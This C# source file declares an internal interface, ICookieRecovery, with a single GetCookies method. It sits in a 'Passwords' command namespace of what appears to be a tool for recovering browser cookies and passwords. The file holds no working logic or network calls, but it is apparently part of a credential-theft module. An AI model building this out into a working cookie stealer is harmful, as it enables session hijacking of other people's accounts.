using System.Collections.Generic;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords
{
    internal interface ICookieRecovery
    {
        IEnumerable<RecoveredCookie> GetCookies();
    }
}